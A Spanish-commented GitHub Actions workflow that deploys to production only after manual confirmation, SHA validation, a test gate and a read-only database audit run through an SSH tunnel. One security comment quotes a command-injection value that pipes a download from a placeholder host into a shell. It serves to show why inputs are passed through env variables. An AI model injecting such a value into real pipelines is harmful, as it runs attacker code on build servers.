name: Deploy a produccion

# Fase 10N-A — automatiza EXACTAMENTE el proceso manual ya documentado en
# docs/korexia/02-INFRAESTRUCTURA.md (git archive + scp + ssh + tar +
# docker build + docker service update --force). No inventa ninguna
# capacidad de EasyPanel: sigue usando Docker Swarm directo sobre el mismo
# servidor, como ya se hacia a mano.
#
# Disparo EXCLUSIVAMENTE manual (workflow_dispatch) — nunca en push ni en
# pull_request. Un push accidental a main jamas dispara un deploy por si
# solo.
#
# Fase 10N-G — GitHub Free en un repo PRIVADO no ofrece "Required
# reviewers" dentro de un Environment (es una funcion de Pro/Team/
# Enterprise para repos privados). NO se asume esa proteccion. En su
# lugar, la autorizacion explicita vive DENTRO del propio workflow, con
# tres capas que no dependen de ningun plan de pago:
#
#   1. El input "confirm" exige escribir la palabra exacta CONFIRMAR. Se
#      verifica del lado del servidor (dentro del job, con un `if`, no
#      solo con `required: true` en el formulario) — la UI de GitHub NO
#      es la barrera, es solo la forma de escribirlo.
#   2. El input "commit_sha" se valida en el propio workflow Y en
#      scripts/deploy.sh: debe ser un SHA hexadecimal de 7-40 caracteres
#      (nunca un nombre de rama/tag/HEAD — una rama es un puntero mutable,
#      un SHA no) Y debe ser un ancestro real de origin/main.
#   3. `environment: production` se mantiene de todos modos: aunque este
#      plan no bloquee con revisores, un Environment SI sigue separando
#      los secretos (DEPLOY_SSH_KEY/DEPLOY_SSH_HOST) de cualquier otro
#      workflow o job que no lo declare — esa parte de Environments es
#      gratis en cualquier plan, para repos privados.
#
# Fase 10N-D (revision pre-commit) — SEGURIDAD: ningun `${{ inputs.* }}` ni
# `${{ secrets.* }}` se interpola directamente dentro de un bloque `run:`.
# GitHub sustituye esas expresiones como TEXTO CRUDO en el script generado
# ANTES de que el shell lo vea — un commit_sha malicioso tipo
# `"; curl evil | sh #` se ejecutaria literalmente. Todo pasa por `env:` y
# se referencia como variable de shell (`"$COMMIT_SHA"`), que es sustitucion
# real del shell, no de la plantilla. Se trata cada input como no confiable.

on:
  workflow_dispatch:
    inputs:
      commit_sha:
        description: "Commit SHA EXACTO a desplegar (7-40 caracteres hex, NUNCA una rama/tag) — debe ser ancestro de origin/main"
        required: true
        type: string
      confirm:
        description: "Escribe exactamente CONFIRMAR (mayusculas) para autorizar el despliegue a produccion"
        required: true
        type: string
      allow_worker_enabled:
        description: "Permitir que el health check final pase aunque CAMPAIGN_WORKER_ENABLED=true (dejar en false salvo que se autorice explicitamente)"
        required: false
        type: boolean
        default: false

concurrency:
  group: deploy-produccion
  cancel-in-progress: false

jobs:
  build-test:
    name: Gate local (typecheck, lint, tests, build)
    runs-on: ubuntu-latest
    env:
      COMMIT_SHA: ${{ inputs.commit_sha }}
    steps:
      - name: Validar formato del commit ANTES de tocar el repo
        run: |
          if ! printf '%s' "$COMMIT_SHA" | grep -Eq '^[0-9a-fA-F]{7,40}$'; then
            echo "::error::commit_sha debe ser un SHA hexadecimal de 7-40 caracteres, nunca una rama/tag/HEAD. Recibido: '$COMMIT_SHA'"
            exit 1
          fi

      - name: Checkout del commit solicitado
        uses: actions/checkout@v4
        with:
          ref: ${{ inputs.commit_sha }}
          fetch-depth: 0

      - name: Confirmar que el commit checked-out es ancestro de origin/main
        run: |
          # El paso de checkout anterior ya solo tiene EXITO si el commit
          # solicitado existe de verdad en el repo — no hace falta comparar
          # nada mas, `git rev-parse HEAD` es exactamente ese commit, ya
          # resuelto.
          RESOLVED="$(git rev-parse HEAD)"
          git fetch origin main --quiet
          git merge-base --is-ancestor "$RESOLVED" origin/main || {
            echo "::error::$RESOLVED no es un ancestro de origin/main — no se despliega codigo no publicado en main."
            exit 1
          }

      - uses: pnpm/action-setup@v4
        with:
          version: 11.5.0

      - uses: actions/setup-node@v4
        with:
          node-version: 22
          cache: pnpm

      - run: pnpm install --frozen-lockfile
      - run: pnpm typecheck
      - run: pnpm lint
      - run: pnpm test
      - run: pnpm build

  deploy:
    name: Deploy (requiere escribir CONFIRMAR + Environment production)
    needs: build-test
    runs-on: ubuntu-latest
    environment: production
    env:
      COMMIT_SHA: ${{ inputs.commit_sha }}
      CONFIRM_INPUT: ${{ inputs.confirm }}
      ALLOW_WORKER_ENABLED_INPUT: ${{ inputs.allow_worker_enabled }}
      DEPLOY_SSH_KEY_CONTENT: ${{ secrets.DEPLOY_SSH_KEY }}
      DEPLOY_SERVER: ${{ secrets.DEPLOY_SSH_HOST }}
    steps:
      - name: Verificar la barrera de confirmacion explicita (server-side, no solo la UI)
        run: |
          if [ "$CONFIRM_INPUT" != "CONFIRMAR" ]; then
            echo "::error::Debes escribir exactamente CONFIRMAR (mayusculas, sin espacios) en el input 'confirm' para autorizar este despliegue a produccion. No se acepta ningun otro valor."
            exit 1
          fi
          echo "Confirmacion explicita verificada — procediendo con el deploy a produccion."

      - name: Checkout del commit solicitado
        uses: actions/checkout@v4
        with:
          ref: ${{ inputs.commit_sha }}
          fetch-depth: 0

      # Node y pnpm los necesita el paso de auditoría de abajo. `deploy.sh` no
      # los usa (todo el trabajo pesado ocurre en el servidor), pero instalarlos
      # aquí es barato y evita un job aparte solo para leer una tabla.
      - uses: pnpm/action-setup@v4
        with:
          version: 11.5.0

      - uses: actions/setup-node@v4
        with:
          node-version: 22
          cache: pnpm

      - run: pnpm install --frozen-lockfile

      - name: Configurar la llave SSH (nunca se imprime, solo se escribe a un archivo con permisos 600)
        run: |
          mkdir -p ~/.ssh
          printf '%s\n' "$DEPLOY_SSH_KEY_CONTENT" > ~/.ssh/deploy_key
          chmod 600 ~/.ssh/deploy_key

      # ── H-2: la arquitectura se audita ANTES de tocar producción ────────
      #
      # El gate de `build-test` (typecheck, lint, tests, build) mira el
      # CÓDIGO. No mira los DATOS, y el incidente que originó todo esto no
      # fue un bug de código: fue una fila incoherente —el domingo desmarcado
      # con su franja de domingo puesta— que llevaba semanas ahí sin que nada
      # la mirara. Un despliegue no debería poder pasar por encima de eso en
      # silencio.
      #
      # Por qué aquí y no en `build-test`: el auditor necesita la base real,
      # y la base no es pública. Se llega por un túnel SSH con la MISMA llave
      # de despliegue que ya usa el paso siguiente — sin abrir ningún camino
      # nuevo al servidor.
      #
      # Por qué se salta sin el secreto: `DEPLOY_DB_URL` mete credenciales de
      # base de datos en CI, y eso amplía lo que se pierde si CI se
      # compromete. Es una decisión del dueño, no del workflow. Sin el
      # secreto el paso avisa y no bloquea; con él, bloquea de verdad.
      # ── H-2: la arquitectura se audita ANTES de tocar producción ────────
      #
      # El gate de `build-test` (typecheck, lint, tests, build) mira el
      # CÓDIGO. No mira los DATOS, y el incidente que originó todo esto no
      # fue un bug de código: fue una fila incoherente —el domingo desmarcado
      # con su franja de domingo puesta— que llevaba semanas ahí sin que nada
      # la mirara. Un despliegue no puede pasar por encima de eso.
      #
      # ⚠️ ESTE PASO NO TIENE CAMINO FAIL-OPEN, Y ES DELIBERADO.
      #
      # La primera versión hacía `exit 0` cuando faltaba `DEPLOY_DB_URL`:
      # "aviso y dejo pasar". Eso convertía una auditoría obligatoria en una
      # sugerencia, y bastaba con borrar un secreto —o no crearlo nunca— para
      # desactivar el guardarraíl sin que nadie se enterara. Un gate que se
      # apaga solo no es un gate.
      #
      # Ahora, TODO lo que impida completar la auditoría detiene el
      # despliegue: falta el secreto, no se abre el túnel, no responde la
      # base, o el auditor encuentra una incoherencia. La única forma de
      # seguir es que la auditoría corra entera y pase.
      #
      # Por qué el túnel: el auditor necesita la base real y la base no es
      # pública. Se llega con la MISMA llave de despliegue que usa el paso
      # siguiente — sin abrir ningún camino nuevo al servidor.
      - name: Auditar la coherencia de la arquitectura (H-2)
        env:
          DEPLOY_DB_URL: ${{ secrets.DEPLOY_DB_URL }}
        run: |
          # `-e` aborta a la primera; `-u` convierte una variable sin definir
          # en error en vez de en cadena vacía; `pipefail` impide que un
          # fallo se pierda dentro de una tubería. Los tres cierran caminos
          # por los que un error se volvería silencioso.
          set -euo pipefail

          if [ -z "${DEPLOY_DB_URL:-}" ]; then
            echo "::error title=Auditoría de arquitectura no ejecutable::Falta el secreto DEPLOY_DB_URL. La auditoría de coherencia es OBLIGATORIA antes de desplegar y sin acceso de solo lectura a la base no se puede ejecutar. Esto DETIENE el despliegue a propósito: un gate que se desactiva por una variable ausente no protege de nada. Configura DEPLOY_DB_URL (cadena de conexión de solo lectura) en los secretos del Environment 'production'."
            exit 1
          fi

          # Socket de control: cerrar el túnel deja de depender de adivinar un
          # PID con pgrep, que acierta hasta el día que hay dos procesos.
          SOCKET=/tmp/korex-auditoria-ssh.sock
          cerrar_tunel() { ssh -S "$SOCKET" -O exit "$DEPLOY_SERVER" 2>/dev/null || true; }
          trap cerrar_tunel EXIT

          if ! ssh -i ~/.ssh/deploy_key \
                   -o StrictHostKeyChecking=accept-new \
                   -o ExitOnForwardFailure=yes \
                   -o ServerAliveInterval=15 \
                   -M -S "$SOCKET" -f -N -L 15433:172.16.1.1:5433 "$DEPLOY_SERVER"; then
            echo "::error title=Auditoría de arquitectura no ejecutable::No se pudo abrir el túnel a la base. No se despliega sin auditar."
            exit 1
          fi

          # Esperar a que el puerto acepte, sin depender de que `nc` exista.
          # Si nunca acepta, se DETIENE: no se despliega a ciegas.
          abierto=""
          for _ in $(seq 1 15); do
            if (exec 3<>/dev/tcp/127.0.0.1/15433) 2>/dev/null; then abierto="si"; break; fi
            sleep 1
          done
          if [ -z "$abierto" ]; then
            echo "::error title=Auditoría de arquitectura no ejecutable::El túnel se abrió pero la base no respondió en 15 s. No se despliega sin auditar."
            exit 1
          fi

          # El auditor es SOLO LECTURA: detecta, informa y devuelve 1 si algo
          # está incoherente. Nunca escribe, nunca "repara", nunca migra.
          # Su código de salida es el de este paso: si falla, no hay deploy.
          DATABASE_URL="$DEPLOY_DB_URL" pnpm auditar:arquitectura

      - name: Ejecutar scripts/deploy.sh
        run: |
          chmod +x scripts/deploy.sh
          ALLOW_FLAG=""
          if [ "$ALLOW_WORKER_ENABLED_INPUT" = "true" ]; then
            ALLOW_FLAG="--allow-worker-enabled"
          fi
          scripts/deploy.sh "$COMMIT_SHA" \
            --server "$DEPLOY_SERVER" \
            --ssh-key ~/.ssh/deploy_key \
            --yes \
            $ALLOW_FLAG

      - name: Limpiar la llave SSH del runner
        if: always()
        run: rm -f ~/.ssh/deploy_key

      - name: Resumen del deploy
        if: always()
        run: |
          {
            echo "### Deploy a produccion"
            echo "- Commit solicitado: \`$COMMIT_SHA\`"
            echo "- Disparado por: $GITHUB_ACTOR"
            echo "- Resultado: $JOB_STATUS"
            echo "- CAMPAIGN_WORKER_ENABLED se deja tal como este configurado en EasyPanel — este workflow nunca lo cambia."
          } >> "$GITHUB_STEP_SUMMARY"
        env:
          JOB_STATUS: ${{ job.status }}
